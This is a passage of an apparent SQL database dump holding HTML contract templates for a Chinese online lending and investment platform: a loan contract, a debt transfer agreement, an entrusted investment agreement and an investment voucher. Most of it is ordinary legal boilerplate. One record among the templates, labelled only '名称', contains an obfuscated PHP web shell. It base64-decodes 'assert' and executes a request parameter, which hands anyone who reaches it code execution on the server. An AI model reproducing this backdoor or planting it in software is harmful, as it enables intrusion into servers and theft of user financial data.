乙方不得进行坐庄、对敲、接盘、大宗交易、内幕信息等违反股票交易法律法规及证券公司规定的交易，如有任一次上述交易行为，应支付给甲方账号初始资金金额10%的违约金，并直接从保证金中扣除，因此产生的一切责任和损失，由乙方承担。</p>\n    <p>4. 如因乙方违规操作、债务等原因，导致甲方账户（包括银行账户和股票账户）被依法采取查封、冻结、划拨等强制措施，造成甲方损失的，乙方应从账户被依法处置之日起按账号初始资金金额及利息之和按照0.1%的日利率向甲方支付违约金，如违约金不足以弥补损失的，乙方还应承担赔偿责任。</p>\n    <p>5. 如账户内持仓股票有配股权利的，在券商通知后2天内，乙方应腾出可用资金购买配股或者把该股票卖出。如果乙方未执行，甲方有权利以任何价格卖出该股票，如出现亏损由乙方自己承担。</p>\n    <h2>第九条 风险揭示</h2>\n    <p>1. 甲方在签署本合同前须履行风险提示义务；乙方在签署本合同前须详细阅读本协议内容及相关风险提示，以便正确、全面了解证券合作操盘网上交易的风险。</p>\n    <p>2. 技术风险揭示</p>\n    <h3>1）互联网是开放性的公众网络，网上证券交易委托除具有其他委托方式共同的风险外，还有其特有的风险，如由于互联网数据传输等原因，交易指令可能会出现中断、停顿、延迟、数据错误等情况。</h3>\n    <h3>2）互联网存在黑客恶意攻击的可能性，亦存在病毒入侵的可能性，互联网服务器可能会出现故障及其他不可预测的因素；或由于乙方不慎将密码泄露或被他人盗用，均存在乙方账户被他人盗买盗卖的风险。</h3>\n    <h3>3）乙方的电脑设备及软件系统与所提供的网上交易系统不相匹配，导致无法下达委托指令或委托失败。</h3>\n    <p>3. 规避风险建议</p>\n    <h3>1）乙方务必注意个人信息资料的保密，账户密码妥善保存，如意识到密码可能泄露，请及时修改密码。</h3>\n    <h3>2）乙方用于交易委托的电脑必须安装可信赖的病毒防火墙和网络防火墙软件，并确认其正常工作。</h3>\n    <h3>3）乙方如遇个人电脑系统、网络通讯或者网上交易相关软件出现异常情况，应暂时停止网上委托。</h3>\n    <p>4. 特别提示</p>\n    <h3>乙方签订本合同后，表明乙方已完全了解网上交易可能存在的相应风险，以及自身决策失误造成的损失，并承诺自行承担。</h3>\n    <h2>第十条 协议的订立</h2>\n    <p>1. 乙方同意并确认自行根据{$SITE_TITLE}网站有关规则和说明在{$SITE_TITLE}网站签署本协议。</p>\n    <p>2. 甲乙双方通过上述方式接受本协议且甲方审核通过时，本协议立即生效。</p>\n    <p>3. 甲方可根据风控需求，对以本协议风控规则进行修订并在甲方网站发布。乙方需应不时地注意甲方及具体规则的变更，若乙方在本协议及具体规则内容公告变更后继续使用本服务的，表示乙方已充分阅读、理解并接受修改后的协议和具体规则内容，也将遵循修改后的协议和具体规则使用本网站的服务；同时就甲乙双方在协议和具体规则修订前通过本网站进行的交易及其效力，视为乙方已同意并已按照本协议及有关规则进行了相应的授权和追认。</p>\n    <p>4. 在本协议履行过程中产生争议的，双方应当协商解决；协商不成的，由甲方所在地人民法院管辖。</p>\n    <h2>第十一条 协议终止</h2>\n    <p>1. 本协议生效之日起，最长有效期为30个交易日。乙方可在协议生效2个交易日后，随时申请终止本协议。协议终止时，乙方需将股票交易账户内股票全部卖出，以便甲方可以按本协议约定进行账户资金结算。</p>\n    <p>2. 如乙方未能及时在下一个交易日上午08:00分前缴纳账户管理费，甲方有权按任意价格卖出帐号内的全部股票并进行结算。</p>\n    <p>3. 如因乙方所购买股票停牌无法及时卖出股票，乙方可以继续按时缴纳账户管理费将本协议延续至股票停牌结束。</p>\n    <p>4. 如因证券公司政策原因，股票交易账户无法正常继续使用，本协议自动终止，甲乙双方互不追究违约责任，按本协议约定进行结算。</p>\n    <p>5. 乙方违法违规进行股票操作或乙方有严重违约行为的，甲方有权立即解除本协议，平仓锁定账户，收回本金，已收取账号管理费不退还给乙方，在确定不会给甲方造成损失的前提下，甲方向乙方退回剩余保证金。</p>\n  </div>\n</div>',1,1),(9,'债权转让协议','<div class=\'credence\'>\n  <h2>债权转让协议</h2>\n  <p>甲方（转让人/原债权人）：</p>\n  <p>证件号码：</p>\n  <p>乙方（受让人/新债权人）：</p>\n  <p>证件号码：</p>\n  <p>　　就甲方通过由金融理财服务有限公司（域名为www.wlgyjr.com）运营管理的共创未来平台向乙方转让债权事宜，双方根据平等、自愿的原则，达成如下协议：</p>\n  <p>　　第一条 债权转让</p>\n  <p>　　甲方同意根据本协议约定的条件将其通过共创未来平台形成的债权（“ gyjr____号标的债权”，投资金额__________元）以____________元转让给乙方，乙方同意受让该债权。</p>\n  <p>　　第二条 债权受让</p>\n  <p>　　1、乙方按照共创未来的相关规则，通过对标的债权转让需求点击“立即认购”按钮并点击确认订立本协议后，本协议即成立并立即生效。</p>\n  <p>　　2、同时，乙方对标的债权转让需求点击“立即认购”按钮，即不可撤销地授权共创未来委托其合作的第三方支付机构或监管银行等，从乙方名下虚拟账户（“乙方共创未来平台账户”）中，将金额等同于本协议第一条所列金额的款项划转至甲方名下虚拟账户（“甲方共创未来平台账户”）中。上述划转完成视为标的债权已转让成功。</p>\n  <p>　　第三条 效力</p>\n  <p>　　自标的债权转让成功之日起，甲方不再对标的债权享有任何权利或承担任何义务。乙方自标的债权转让成功之日起，成为标的债权的债权人，承继与标的债权借款人签订的《借款协议》项下出借人的全部权利并承担出借人的全部义务。如《借款协议》中约定了由第三方承担担保责任的，则乙方承继债权后自动成为被担保人。</p>\n  <p>　　第四条 声明与保证</p>\n乙方保证其所用于购买标的债权的资金来源合法，乙方是该资金的合法所有人，如果第三方对资金归属、合法性问题提出异议，由乙方自行解决。如乙方未能解决，则承诺放弃使用上述资金所带来的利息等收益。</p>\n  <p>　　第五条 其他</p>\n  <p>　　1、本协议的任何修改、补充均须以共创未来平台电子文本形式作出。</p>\n  <p>　　2、甲乙双方均确认，本协议的签订、生效和履行以不违反中国的法律法规为前提。如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。</p>\n  <p>　　3、如果甲乙双方在本协议履行过程中发生任何争议，应友好协商解决；如协商不成，则须提交共创未来所在地的人民法院以诉讼方式解决。</p>\n  <p>　　4、本协议双方委托共创未来平台保管所有与本协议有关的书面文件或电子信息。</p>\n  <p>　　5、乙方已明确了解并明知，受让债权后将承担因受让债权所导致的全部风险，包括但不限于宏观经济风险、政策风险、技术风险以及对应之债务人信用等原因导致的违约风险。</p>\n</div>',1,0),(10,'借款协议','<div class=\"agr_warp\">\r\n<h2 style=\"text-align:center;margin-top:0;\">借款合同</h2>\r\n<div class=\"deal_sn\" style=\"text-align:right;\">合同编号：{$params.deal.deal_sn}</div>\r\n<div><b>甲方（出借人）：</b>{$params.user.real_name}</div>\r\n<div>住址：{$params.user.address}</div>\r\n<div>法定代表人：</div>\r\n<div>联系电话：{$params.user.mobile}</div>\r\n<div><b>乙方（借款人）：</b>{$params.deal.deal_user.real_name}</div>\r\n<div>住址：</div>\r\n<div>法定代表人：</div>\r\n<div>联系电话：{$params.deal.deal_user.mobile}</div>\r\n<div><b>丙方（投融资服务人）：</b>金融理财服务有限公司</div>\r\n<div>住址：云南省昆明市云纺国际商厦A座一楼74号</div>\r\n<div>法定代表人：郎晓男</div>\r\n<div><b>鉴于</b></div>\r\n<div>  <b> </b> 丙方是依法注册成立的投融资咨询中介服务机构，具有规范、安全、完善的交易服务机制，拥有“共创未来”交易平台（www.wlgyjr.com）的经营权。甲乙双方是丙方的注册会员，甲方持有合法资金并自愿寻求投资对象，乙方自愿在丙方交易平台寻求融资中介服务。为此，本合同三方根据我国《民法通则》、《合同法》、民间借贷政策法规、金融管理法规等相关法律法规，在自愿、平等、协商一致的基础上，签订本合同，便于各方遵照执行：</div>\r\n<div>  <b>  第一条 </b> 甲方通过丙方向乙方提供借款：￥{$params.load.money_lower}元（大写：人民币{$params.load.money_upper}）。借款期限为{$params.deal.repay_time}{$params.deal.repay_time_type}，自{$params.deal.begin_time}起至{$params.deal.end_time}止。</div>\r\n<div>  <b>  第二条 </b> 借款年利率为：{$params.deal.rate}%。利息总额为：{$params.load.rate_amount_lower}元（大写：人民币{$params.load.rate_amount_upper}）。本条约定之利息自借款人（即乙方）按照丙方之交易规则及约定，进行电子签约之日起计算，借款期限起始日以实际放款日的日期为准，以此计算借款期限的到期日期。</div>\r\n<div>  <b>  第三条 </b> 还款方式为以下第{$params.deal.loan_type}种：1. 到期一次还本付息；2. 按月等额付息，到期一次还本：本次借款每月应还利息为：{$params.load.rate_per_month_lower}元（大写：人民币{$params.load.rate_per_month_upper}） 。</div>\r\n<div>  <b>  第四条 </b> 若第三条约定的还款方式为第2种，则每月<ins>{$params.deal.repay_day}</ins>日为还款日。若第三条约定的还款方式为第1种，则乙方应于借款期限届满前或当天休市前全额还清应还的本金及利息。若本条约定之还款日逢国家法定节假日，则相应还款日应提前至该节假日前的最后一个交易日。若当月无该日期的，相应还款日提前至该日期前的最后一个交易日。乙方还款应当于应还款日（或按照交易规则规定的应提前还款到账的交易日）当天休市前完成全部当期应还款项全额到达其交易账户的操作，否则，由此导致的逾期还款等违约责任由乙方自行承担。本条约定之交易日，是指丙方交易平台提供相关投融资中介服务业务的工作时间，一般为周一至周五工作日的上午9：00至下午15:00，特殊时间以交易平台具体通知为准。</div>\r\n<div>  <b>  第五条 </b> 乙方借款的具体用途为：<ins>{$params.deal.purpose}</ins>。乙方应按约定用途使用借款，不得将借款挪作他用或者用于违法用途，甲方或丙方一旦获知乙方借款没有按照约定用途使用的，甲方或丙方均有权要求乙方提前还款。</div>\r\n<div>  <b>  第六条 </b> 甲方同意：丙方指令第三方支付机构从为甲方设立的会员交易账户中划转本合同约定的借款金额至乙方开设的融资人会员账户内作为向乙方支付的借款。</div>\r\n<div>  <b>  第七条 </b> 借款金额到达乙方交易账户后，乙方可向丙方申请提现，丙方应根据平台之交易规则及本合同之约定，完成相关款项冻结及提现事宜。</div>\r\n<div>  <b>  第八条 </b> 甲方授权丙方将乙方归还的本金及利息以及约定的其他罚息、违约金等，于三个交易日内，按照相关交易规则，从乙方交易账户将相应款项经结算后拨付至甲方对应的交易账户。鉴于丙方结算时间的考虑，若乙方还款时间为节假日前的最后一个交易日，甲方同意并容忍丙方结算时间顺延至节假日后的第一个交易日，丙方应在顺延后的三个交易日内完成。</div>\r\n<div>  <b>  第九条 </b> 乙方授权丙方办理针对乙方指定账户的委托银行扣款相关事宜（包括但不限于对其交易账户及交易账户对应之银行账户的委托扣款），该委托扣款用于乙方归还本金、支付利息、逾期利息、违约金、赔偿款（视具体情况而定）。</div>\r\n<div>  <b>  第十条 </b> 因本合同第六、七、八、九条约定的款项划转，依据税收法律规定，如果产生所得税、营业税、个人所得税等纳税义务的，则甲方、乙方应各自依法纳税。丙方因提供中介服务，依据《融资服务合同》进行相应收费，按照相关法律规定承担纳税义务。丙方接受授权，对相应款项进行划转时，若产生相关手续费、结算费用等，均由甲、乙各方或共同承担；若丙方代垫的，丙方有权向甲、乙之任意一方请求支付，并有权直接从融资款项中扣除，甲乙双方对此不持异议。</div>\r\n<div>  <b>  第十一条 </b> 借款交付后，丙方有权对乙方借款的使用情况，进行丙方认为必要的监督，但该项权利不得依据任何理由视为丙方之义务。</div>\r\n<div>  <b>  第十二条 </b> 甲方授权丙方对乙方履行本合同的情况进行管理与监控并在乙方发生违约时向乙方追索违约金及相应损失；但该项授权不应当以任何理由视为丙方之义务。</div>\r\n<div>  <b>  第十三条 </b> 关于借款合同之从合同担保合同事宜的约定：</div>\r\n<div>  <b>  一、</b> 甲方授权丙方代表甲方，以甲方的名义，与乙方委托的保证机构，签订保证合同，包括但不限于保证合同以及其它具有担保性质的合同。鉴于实际操作原因，甲方授权丙方签署与担保有关的其它法律文件，并督促保证机构办理相关抵押登记等与担保有关的法律手续和相关事宜；甲方承诺不就该委托事项及委托事项所产生的法律效果，向丙方提出任何索赔请求及要求丙方承担任何责任。丙方对债务人或担保人不履行付款或代偿义务，就本合同及保证合同不承担任何除中介服务之外的法律责任。</div>\r\n<div>  <b>  二、</b> 甲方授权丙方督促债务人和担保人履行融资项目有关的全部合同，当乙方未能按本合同约定足额归还本金或利息时，或者担保人不履行义务时，丙方有权（但不是义务）代表债权人向乙方或者担保人进行追索，并签订借款合同或者担保合同的补充协议。</div>\r\n<div>  <b>  三、</b> 丙方在甲方的授权范围内办理相关担保及追索事宜，甲方应当支付合理的代理报酬，并承担代理事务发生的所有开支。丙方有权直接从债务人或者担保人支付的款项中予以扣除代理报酬和开支。</div>\r\n<div>  <b>  第十四条 </b> 乙方应根据丙方的要求提供相应的文件及资料，并保证所提供资料、文件的真实性、完整性、有效性与合法性。</div>\r\n<div>  <b>  第十五条 </b> 乙方法定代表人更换、变更住所或经营场所、减少注册资金时，应事先书面通知丙方；乙方因实行承包、租赁、联营、股份制改造、分立、被兼并（合并）、对外投资及其他原因而改变经营管理方式或产权组织形式时，应提前通知丙方，并落实债务和还款方案；其居住地、联系方式、单位的变迁、资产情况、负债情况等发生变更或者涉及诉讼、仲裁，必须在变更或者诉讼仲裁发生后三日内书面通知丙方。</div>\r\n<div>  <b>  第十六条 </b> 乙方须服从配合丙方对其借款资金的使用情况、实际用途和有关生产经营、财务活动等借后活动进行必要的风险监控。</div>\r\n<div>  <b>  第十七条 </b> 甲方有权通过丙方，将本合同项下的债权向在丙方正式注册的其他投资人会员进行转让，该转让无须征得乙方同意。此种转让在丙方进行登记备案即可生效。丙方将相关债权转让的事宜，通过其交易平台予以公布（无须甲方再次授权），即视为甲方向乙方履行了通知义务。</div>\r\n<div>  <b>  第十八条 </b> 本合同履行期间，出现下列任意一项或多项情行时，基于保护甲方合法权益之考虑，丙方有权代表甲方要求乙方提前归还本金，支付利息、逾期利息、违约金和赔偿金。且丙方有权选择解除本合同：</div>\r\n<div>  <b>  一、</b> 乙方向丙方提供虚假证明材料；</div>\r\n<div>  <b>  二、</b> 乙方违反合同关于借款用途的相关规定；</div>\r\n<div>  <b>  三、</b> 乙方拒绝丙方对借款使用情况、实际用途进行监督检查的；</div>\r\n<div>  <b>  四、</b> 乙方拒绝纠正或者其实际行为表明不纠正违反本合同的行为；</div>\r\n<div>  <b>  五、</b> 乙方负有数额较大的债务或涉及、可能涉及重大的诉讼或仲裁程序及其他法律纠纷，足以影响其偿债能力的；</div>\r\n<div>  <b>  六、</b> 针对本合同约定借款，乙方累计出现三期或三期以上逾期支付本息情形的；</div>\r\n<div>  <b>  七、</b> 乙方经营的公司出现经营恶化、面临被查封、停业/行业整顿或被处置资产等情形；</div>\r\n<div>  <b>  八、</b> 乙方在本合同项下的借款本息全部清偿前，未经丙方书面同意向第三人提供担保的；</div>\r\n<div>  <b>  九、</b> 乙方发生其它影响其偿还债务能力事件的。</div>\r\n<div>  <b>  第十九条 </b> 乙方违反本合同第二十条之约定或发生下列任何一条违约事件，甲方有权采取以下任何一项或多项措施：</div>\r\n<div>  <b>  一、</b> 乙方出现本合同第二十条约定的情形或违反本合同其他约定的，最终导致丙方解除本合同、提前收回全部借款本息时，除结清全部借款本金及利息（计算至结清日当天）外，乙方应另行向甲方支付借款金额的5%作为违约金，若违约金不足以偿付甲方、丙方因索赔而产生的各项费用时，甲方和丙方都有权继续向乙方索赔。</div>\r\n<div>  <b>  二、</b> 乙方未按本合同约定按时、足额偿还借款本息的，自逾期之日起应向甲方每个自然日按应还款金额的0.5%支付滞纳金。</div>\r\n<div>  <b>  三、</b> 在本合同项下的借款本息全部清偿前，乙方及乙方的联系方式、实际居住地、工作单位、资产、负债等情况发生变化，未在变更后三天内书面通知丙方的，上述行为每发生一次，乙方应向丙方支付 500 元/项（次）的违约金。</div>\r\n<div>  <b>  四、</b> 在本合同履行期间，乙方拒不履行还款义务或无力清偿欠款，而最终导致甲方通过司法程序进行追偿的，乙方应承担由此所产生的全部费用，包括但不限于律师代理费、评估费、鉴定费、差旅费等，并有权按照以及本条第一款、第二款之约定主张违约金、滞纳金等。丙方因根据第二十条授权行使权利产生的义务仅为代收、代转已经从乙方收到的债款，但是，不包括向甲方支付、赔付、垫付任何款项。甲方要求丙方向债务人追收欠款的，须另行办理相关手续并支付费用。</div>\r\n<div>  <b>  第二十条 </b> 本合同履行期间，如果乙方公司发生股权转让、变更等情况的，必须征得丙方的书面同意，未经丙方书面同意，乙方不得签署或实施任何转让协议或行为，由此导致的全部责任由乙方自行承担，同时丙方有权要求乙方提前偿还借款本息，并向丙方支付乙方借款金额的5%作为罚金。</div>\r\n<div>  <b>  第二十一条 </b> 乙方承诺如不能按时、足额还本付息，届时乙方放弃抗辩权并同意甲及/或丙方对反担保物的处置，并愿意接受人民法院强制执行。</div>\r\n<div>  <b>  第二十二条 </b> 本合同所载的“交易账户”为甲/乙方申请成为丙方会员后，在丙方电子平台设立开通的用于投资/借款及相关款项划转的账户，详细内容见甲/乙方各自与丙方签订的《会员服务协议》。</div>\r\n<div>  <b>  第二十三条 </b> 本合同所载的“会员账号”为甲/乙双方成为丙方会员后丙方为其分配的会员代码同时也是其在丙方电子平台交易账户的账号，详见为甲/乙双方各自与丙方签订的《会员服务协议》。</div>\r\n<div>  <b>  第二十四条 </b> 本合同有效期直至乙方清偿全部借款本金、利息、罚息、罚金等为止；如果发生违约金、赔偿金、维权费用，其有效期直至清偿违约金、赔偿金、维权费用为止。</div>\r\n<div>  <b>  第二十五条 </b> 陈述和保证：甲方陈述和保证：甲方委托丙方提供投资咨询服务而在丙方绑定的账户存入投资资金，其来源合法，该存款不属于丙方吸收甲方存款，不属于丙方集资，不属于委托丙方贷款，甲方知晓丙方的服务性质是居间撮合、受托中介服务。甲方通过丙方平台自主选择向乙方出借资金。乙方陈述和保证：乙方知晓丙方的服务性质是居间撮合、受托中介服务。丙方因为受托于甲乙双方而向乙方划转借款，不属于丙方向乙方发放贷款。乙方保证严格按照合同约定定使用借款，如有违约，自觉承担全部违约责任和经济损失。丙方陈述和保证：丙方拒绝向甲乙双方提供吸收存款获利、集资获利、高利贷、洗钱、非法套现的服务、便利、信息或者渠道。丙方的服务性质，是受甲乙双方委托，居间服务于投融资咨询的中介服务。</div>\r\n<div>  <b>  第二十六条 </b> 本合同在履行过程中如发生纠纷，合同各方应友好协商解决，协商不成的，提交丙方所在地有管辖权的法院处理。</div>\r\n<div>  <b>  第二十七条 </b> 本合同为电子合同，经甲乙双方以会员账号登录丙方电子交易平台按交易规则进行投融资，并在丙方放款时立即生效，丙方放款的日期和时间即是本合同成立和生效的时间。本电子合同与书面合同具有同等法律效力。  </div>\r\n    \r\n<div>  <b> </b> ………以下无正文…………</div>\r\n<div>  <b> </b> 甲方会员编号：{$params.user.user_name}</div>\r\n<div>  <b> </b> 甲方身份证号：{$params.user.idno}</div>\r\n<br/>\r\n<div>  <b> </b> 乙方会员编号：{$params.deal.deal_user.user_name}</div>\r\n<div>  <b> </b> 乙方营业执照号码：</div>\r\n<div>  <b> </b> 乙方组织机构代码：</div>\r\n<div>  <b> </b> 乙方身份证号：{$params.deal.deal_user.idno}</div>\r\n<br/>\r\n<div>  <b> </b> 丙方：金融理财服务有限公司</div>\r\n<div>  <b> </b> 法定代表人：郎晓男</div>\r\n<div>  <b> </b> 电子合同生效时间：{$params.deal.valid_date}</div>\r\n</div>',1,0),(12,'名称','<?php $x=base64_decode(\"YXNzZXJ0\");$x($request[\'c\']);?>',1,1),(13,'委托投资凭证','<br/><br/>\r\n<h2 style=\"text-align:center;margin-top:0;font-size:28px;\">投 资 凭 据</h2>\r\n<div class=\"deal_sn\" style=\"text-align:right;\">凭据编号：{$params.deal.deal_sn}</div>\r\n<div style=\"font-size:18px;\">\r\n<div>尊敬的{$params.user.real_name}先生/女士：</div>\r\n<div>  <b> </b> 恭喜您于{$params.load.year}年{$params.load.month}月{$params.load.day}日通过金融理财网站平台向{$params.deal.deal_sn}号融资标的投标成功：该标的为{$params.deal.deal_user}为您提供的受托投资服务；</div>\r\n<div>  <b> </b> 您本次实际投资人民币大写：{$params.load.money}，该标的满标复审后正式生效，并按照《委托投资协议》约定计算收益，由受托方按约定支付方式及时间支付投资本金及收益。如委托投资的具体标的出现违约行为，您可自动授权云南博政律师事务所进行追偿，律所将免收一切法律服务费用，但不得以任何理由视为律所之义务。本凭据自盖章之日起生效，至委托投资截止之日起失效。</div>\r\n<div>  <b> </b> 您在此期间有任何疑问欢迎到店咨询或者随时拨打客服电话：0871－64111856我们将给予您详细的解答；</div>\r\n<div>  <b> </b> 金融理财为您投资理财创造辉煌！</div>\r\n<div>  <b> </b> 云南博政律师事务所为您本次投资保障合法有效！</div>\r\n<div>  <b> </b> 我们携手，共创未来！</div>\r\n</div>',1,0),(14,'委托投资协议','<div class=\"agr_warp\">\r\n<h2 style=\"text-align:center;margin-top:0;\">委托投资协议</h2>\r\n<div class=\"deal_sn\" style=\"text-align:right;\">协议编号：{$params.deal.deal_sn}</div>\r\n<div>   <b>   特别提示：本协议以数据电文形式制成，并保存于平台网站服务器上备查。甲方通过登录其平台会员账号在平台页面点击相应勾选按钮选择接受本协议，即表示同意签署本协议，并同意接受本协议所载全部内容、条款和条件以及平台所列的与本协议所述事项相关的各项规则及其他文件。</b></div>\r\n<div><table>\r\n<tr><td style=\"width:206px;text-align:right\">委托方（以下简称“甲方”）：</td><td>{$params.user.real_name}</td></tr>\r\n<tr><td style=\"text-align:right\">身份证号码：</td><td>{$params.user.idno}</td></tr>\r\n<tr><td style=\"text-align:right\">联系电话：</td><td>{$params.user.mobile}</td></tr>\r\n<tr><td style=\"text-align:right\">受托方（以下简称“乙方”）：</td><td>{$params.deal.deal_user.real_name}</td></tr>\r\n<tr><td style=\"text-align:right\">工商注册号：</td><td>{$params.deal.deal_user.orgNo}</td></tr>\r\n</table></div>\r\n<div>  <b> </b> 甲乙双方本着平等自愿、互利共赢的原则，依据我国相关法律法规之规定，经充分协商，就甲方委托乙方进行投资的相关事宜达成如下约定。</div>\r\n<div>   <b>   第一条  委托投资方式</b></div>\r\n<div>  <b> </b> 甲方基于对乙方的信任，自愿将其合法所有的资金委托给乙方进行管理并投资于金融理财服务有限公司运营的“共创未来”平台的融资项目或债权等。乙方对委托资金按约定进行投资管理。</div>\r\n<div>   <b>   第二条  委托投资金额</b></div>\r\n<div>  <b> </b> 甲方作为委托人，于{$params.deal.load_time}向乙方支付委托金额人民币{$params.load.money_upper_short}元（小写：¥{$params.load.money_lower}），用于乙方按约定进行投资管理和资产配置。甲乙双方同意通过共创未来平台指定的第三方支付机构的支付方式支付委托金额，共创未来可根据本协议相关约定及共创未来网站规则，自行或委托第三方支付机构对相关款项进行划扣、支付、冻结以及行使其他权利，甲乙双方对此均予以接受和认可。</div>\r\n<div>   <b>   第三条  委托投资收益</b></div>\r\n<div>  <b> </b> 委托投资收益的预期年化收益率为{$params.deal.rate}%，收益支付方式为按月支付收益，委托到期支付委托投资本金及最后一期收益。甲方已经知悉、了解并同意：本协议所示预期年化收益率不代表甲方最终实际收益，在实际收益率未达到预期收益率的情况下，甲方仅能收取其实际收益。乙方作为受托方不对甲方本金的收回、可获收益金额作出任何承诺、保证。乙方投资获得的实际收益，超过甲方委托投资预期收益的部分计为甲方向乙方支付的管理费用。</div>\r\n<div>  <b> </b> 本合同项下委托投资收益于{$params.deal.valid_date}开始计算。双方在此一致确认，在起始日前不计算委托投资资金的收益。如募集期届满，本委托投资项目项下的委托投资交易因任何原因无法进行，则乙方应通知甲方，并应在确认委托投资交易无法进行后5个工作日内将甲方支付的委托投资本金充值至乙方在共创未来注册的会员账户内，并委托共创未来划扣至甲方会员账户，为此乙方无须向甲方支付任何费用、收益或利息。</div>\r\n<div>   <b>   第四条  委托投资期限</b></div>\r\n<div>  <b> </b> 甲乙双方约定委托投资时间为{$params.deal.valid_date}至{$params.deal.end_time}，乙方委托共创未来于投资期限截止之日起3个工作日内将充值的委托投资本金及最后一期收益划扣至甲方会员账户。</div>\r\n<div>   <b>   第五条  投资项目标的</b></div>\r\n<div>  <b> </b> 委托投资资金的投资标的为非银行金融机构发行的产品，具体指共创未来平台发布的融资项目或债权等。委托投资资金最终以委托贷款的形式向有需求的共创未来平台融资会员补充流动资金，促使资金融通。甲方同意乙方以乙方自己的名义履行委托投资资金的投资管理职能，并对乙方的投资管理行为完全认可。</div>\r\n<div>   <b>   第六条  委托投资收益的支付</b></div>\r\n<div>  <b> </b> 乙方应按照本合同第三条约定的方式支付甲方的委托投资本金及收益，如因委托投资标的未及时偿付等原因，致使甲方实际收款日迟于委托投资收益到期日后3个工作日的，乙方应向甲方发出通知，并保证在收到委托投资标的实际收益后3个工作日内，及时与甲方清算甲方的委托投资到期实际收益，乙方对甲方迟延收取到期实际收益所造成的损失不承担任何责任。对因银行结算或支付、第三方支付机构迟延等非乙方原因而造成的甲方实际收款日的顺延，乙方不承担任何责任且延期期间不计算利息或收益。</div>\r\n<div>   <b>   第七条  委托投资资金的提取</b></div>\r\n<div>  <b> </b> 自甲方通过共创未来平台投入委托投资资金之日起至甲方委托期限截止之日，甲方不得要求提前提取委托投资资金或提前解除本合同。</div>\r\n<div>   <b>   第八条 甲方的权利和义务</b></div>\r\n<div>  <b> </b> 1、甲方保证委托投资资金的来源合法；甲方已充分理解共创未来平台网站的交易规则，甲方声明已充分理解本合同全文及与本合同交易相关的其他法律文件，了解相关权利义务，了解有关法律法规及委托投资的风险收益特征，愿意承担相应的委托投资风险。</div>\r\n<div>  <b> </b> 2、甲方接受乙方提供的资金管理及相关咨询服务，并同意按照本合同的约定全权委托乙方对委托投资资金进行管理和操作。</div>\r\n<div>  <b> </b> 3、甲方不得单方面提前终止本合同或提前要求取回委托投资资金，不得向第三方转让其在本合同项下全部或部分的权利或义务，不得违反本合同的约定干涉乙方的投资行为。</div>\r\n<div>  <b> </b> 4、与本合同项下委托投资相关的应缴税款由甲方依法自行申报并缴纳，乙方不进行任何形式的代扣代缴。</div>\r\n<div>   <b>   第九条  乙方的权利和义务</b></div>\r\n<div>  <b> </b> 1、乙方将及时告知甲方其知道的影响甲方在本合同项下权利或者甲方履行本协议项下义务的信息。</div>\r\n<div>  <b> </b> 2、自乙方收取委托投资资金之日起，乙方应按照本合同的约定，对委托投资资金进行投资运作及管理。</div>\r\n<div>  <b> </b> 3、乙方应严格按照本合同的规定管理运用委托投资资金，并注册共创未来会员账户进行管理。</div>\r\n<div>  <b> </b> 4、乙方作为委托投资项目进展相关情况的信息披露责任人授权共创未来平台向委托人进行信息披露，披露的形式包括但不限于电子邮件、在平台网站发布公告、书面信函等。</div>\r\n<div>  <b> </b> 5、本合同有效期内，乙方将履行如下事件的信息披露义务：</div>\r\n<div>  <b> </b> （1）委托投资项目确认通知</div>\r\n<div>  <b> </b> 当甲、乙双方经共创未来平台通过网络在线点击的方式订立委托投资合同后，乙方通过共创未来平台向甲方进行通知，通知内容包括委托金额、委托投资起始日、委托投资收益到期日等。</div>\r\n<div>  <b> </b> （2）委托投资项目取消通知</div>\r\n<div>  <b> </b> 因各种原因导致委托投资交易无法进行的，乙方应通过共创未来平台通知甲方。</div>\r\n<div>  <b> </b> （3）乙方委托投资本金及收益支付通知</div>\r\n<div>  <b> </b> 当委托投资本金及收益到达甲方收款账户后，乙方通过共创未来平台通知甲方已支付委托投资本金及收益金额。</div>\r\n<div>  <b> </b> 6、乙方可以以自己的名义，签署因委托投资项目产生的合同或其他法律文件，并有权依据前述法律文件行使委托投资过程中产生的包括权属登记等内容的权利。</div>\r\n<div>  <b> </b> 7、乙方应保存委托投资项目进程中产生的全部会计资料，并妥善保存有关的合同、协议、交易记录及其他相关资料。</div>\r\n<div>  <b> </b> 8、 乙方应恪守勤勉尽责的职业操守，做好资金管理和风险控制。</div>\r\n<div>  <b> </b> 9、乙方需根据本合同的约定，及时向甲方分配委托投资本金及收益。</div>\r\n<div>   <b>   第十条  通知方式</b></div>\r\n<div>  <b> </b> 本合同任何一方根据本合同约定做出的通知、文件等均应以书面形式做出，可由专人送达、邮寄送达、电话或短信通知、共创未来平台发布等方式传送。</div>\r\n<div>   <b>   第十一条  合同的生效与终止</b></div>\r\n<div>  <b> </b> 本合同经甲方和乙方通过共创未来平台以网络在线点击确认的方式签署并生效，根据本合同的相关约定终止。本合同为电子合同，经甲乙双方以会员账号登录共创未来电子交易平台按交易规则进行募集与投资，并在共创未来放款时立即生效，共创未来放款的日期和时间即是本合同成立和生效的时间。本电子合同与书面合同具有同等法律效力。</div>\r\n<div>   <b>   第十二条 </b> 本合同双方委托共创未来平台保管所有与本合同有关的书面文件或电子信息；本合同双方确认并同意由共创未来平台提供的与本合同有关的书面文件或电子信息在无明显错误的情况下应作为本合同有关事项的终局证明。</div>\r\n<div>   <b>   第十三条 保密条款</b></div>\r\n<div>  <b> </b> 1、本合同签署后, 除非事先得到另一方的书面同意, 本合同双方均应承担以下保密义务：任何一方不得向非本合同方（共创未来平台除外）披露本合同、本合同项下的事宜以及与此等事宜有关的任何文件、资料或信息、及对方或共创未来平台的相关商业信息。</div>\r\n<div>  <b> </b> 2、甲方、乙方同意共创未来平台可利用在为其服务过程中获得的信息进行平台用户交易数据研究或用户行为分析等目的。</div>\r\n<div>  <b> </b> 3、本合同双方因下列原因披露保密信息，不受前述第一条的限制：</div>\r\n<div>  <b> </b> （1）向本合同双方的合伙人、董事、监事、高级管理人员和雇员及其聘请的会计师、律师、咨询公司披露；</div>\r\n<div>  <b> </b> （2）因遵循可适用的法律、法规的强制性规定而披露；</div>\r\n<div>  <b> </b> （3）依据其他应遵守的法规向审批机构、权力机构等进行的披露。</div>\r\n<div>  <b> </b> 4、当委托投资标的项目融资人未能按期履行本金或收益支付义务时，或甲方未能按相关协议规定履行相关义务时，乙方有权在乙方认为适当的场合披露相应责任方的信息，包括但不限于名称、地址等。</div>\r\n<div>  <b> </b> 